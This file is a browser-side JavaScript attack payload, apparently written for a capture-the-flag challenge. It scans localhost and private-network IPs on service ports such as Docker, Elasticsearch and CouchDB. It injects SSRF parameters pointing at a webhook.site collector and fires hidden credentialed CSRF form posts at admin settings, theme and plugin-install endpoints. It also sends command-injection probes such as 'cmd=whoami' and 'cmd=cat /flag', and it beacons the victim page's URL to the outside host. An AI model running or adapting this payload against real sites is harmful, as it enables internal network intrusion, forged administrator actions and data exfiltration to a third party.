(function(){
  try {
    var WEBHOOK = "https://webhook.site/e925819f-2c81-4cbe-a619-a0f20f9aa493"; // <-- your webhook.site URL
    var TAG = "ssrf_probe_v1";

    function beacon(ev, extra) {
      try {
        // tiny GET beacon so you can see activity in webhook logs quickly
        var url = WEBHOOK + "?ev=" + encodeURIComponent(ev) + "&u=" + encodeURIComponent(location.href) + "&t=" + Date.now();
        if (extra) url += "&x=" + encodeURIComponent(extra);
        (new Image()).src = url;
      } catch(e){}
    }

    beacon(TAG + "_loaded");

    // target host:port combinations and common api paths
    var hosts = [
      "127.0.0.1","localhost","::1","0.0.0.0",
      "192.168.0.1","192.168.0.2","192.168.0.10","192.168.1.1",
      "10.0.0.1","10.0.0.2"
    ];
    var ports = [80,8000,8080,8081,9000,9001,9200,5984,2375];
    var apiPaths = ["/api.php","/api","/api/v1","/phpinfo.php","/status","/debug","/admin","/"];

    // helper to perform blind GET via Image + no-cors fetch (fires request, no readable response)
    function fireGet(u){
      try {
        // image request (very reliable for simple GET)
        var i = new Image();
        i.src = u + (u.indexOf('?') === -1 ? '?_=' : '&_=') + Math.random();
      } catch(e){}
      try {
        // fetch no-cors (sends cookies if same-site and credentials included)
        fetch(u + (u.indexOf('?') === -1 ? '?_=' : '&_=') + Math.random(), { mode: 'no-cors', credentials: 'include' }).catch(()=>{});
      } catch(e){}
    }

    // helper to try to POST a form (DOM form submit uses cookies and is good for CSRF-style POST)
    function submitForm(path, data){
      try {
        var f = document.createElement('form');
        f.method = 'POST';
        f.action = path;
        f.style.display = 'none';
        for (var k in data) {
          var input = document.createElement('input');
          input.type = 'hidden';
          input.name = k;
          input.value = data[k];
          f.appendChild(input);
        }
        document.body.appendChild(f);
        f.submit();
      } catch(e){}
    }

    // Try probes:
    // 1) direct host:port + path probes
    hosts.forEach(function(h){
      ports.forEach(function(p){
        apiPaths.forEach(function(pth){
          var base = "http://"+h+":" + p + pth;
          // Fire a simple GET to the path
          fireGet(base);
          // Try common SSRF-style params that ask the service to fetch a remote URL
          try {
            // ?url=WEBHOOK
            fireGet(base + (base.indexOf('?')===-1 ? '?' : '&') + "url=" + encodeURIComponent(WEBHOOK));
            // ?callback=WEBHOOK
            fireGet(base + (base.indexOf('?')===-1 ? '?' : '&') + "callback=" + encodeURIComponent(WEBHOOK));
            // ?next=WEBHOOK and ?redirect=WEBHOOK are common too
            fireGet(base + (base.indexOf('?')===-1 ? '?' : '&') + "next=" + encodeURIComponent(WEBHOOK));
            fireGet(base + (base.indexOf('?')===-1 ? '?' : '&') + "redirect=" + encodeURIComponent(WEBHOOK));
            // API specific attempt: ?fetch=WEBHOOK
            fireGet(base + (base.indexOf('?')===-1 ? '?' : '&') + "fetch=" + encodeURIComponent(WEBHOOK));
          } catch(e){}
        });
      });
    });

    // 2) Try localhost on common ports without explicit path
    var common = [
      "http://127.0.0.1:80/","http://127.0.0.1:8000/","http://127.0.0.1:8080/","http://127.0.0.1:9200/",
      "http://127.0.0.1:2375/","http://127.0.0.1:5984/"
    ];
    common.forEach(function(u){ fireGet(u); });

    // 3) Try smart POSTs to endpoints that sometimes accept remote URLs (CSRF-like)
    // these POSTs use credentials so they will be sent with cookies
    var csrfs = [
      { path: "/admin/settings", fields: { "site_theme_url": WEBHOOK } },
      { path: "/admin/theme", fields: { "theme_url": WEBHOOK } },
      { path: "/admin/plugins/install", fields: { "plugin_url": WEBHOOK } },
      { path: "/admin/import", fields: { "import_url": WEBHOOK } },
      { path: "/install.php", fields: { "url": WEBHOOK } }
    ];
    csrfs.forEach(function(c){
      try {
        submitForm(c.path, c.fields);
      } catch(e){}
    });

    // 4) Try direct access to the challenge api.php at common internal IPs (specific)
    var directTargets = [
      "http://127.0.0.1/api.php",
      "http://127.0.0.1:8080/api.php",
      "http://192.168.0.10/api.php",
      "http://192.168.0.10:8080/api.php",
      "http://localhost/api.php"
    ];
    directTargets.forEach(function(t){ 
      // try simple GET
      fireGet(t);
      // try common query options
      fireGet(t + "?url=" + encodeURIComponent(WEBHOOK));
      fireGet(t + "?callback=" + encodeURIComponent(WEBHOOK));
      fireGet(t + "?cmd=whoami"); // may trigger command in misconfigured API
      fireGet(t + "?cmd=cat%20%2Fflag"); // hope for server-side fetch or execution (no guarantee)
    });

    // final beacon
    setTimeout(function(){ beacon(TAG + "_done", "probes_sent"); }, 4000);

  } catch(e){
    try { (new Image()).src = "https://webhook.site/e925819f-2c81-4cbe-a619-a0f20f9aa493?err=" + encodeURIComponent(e.message); } catch(_) {}
  }
})();
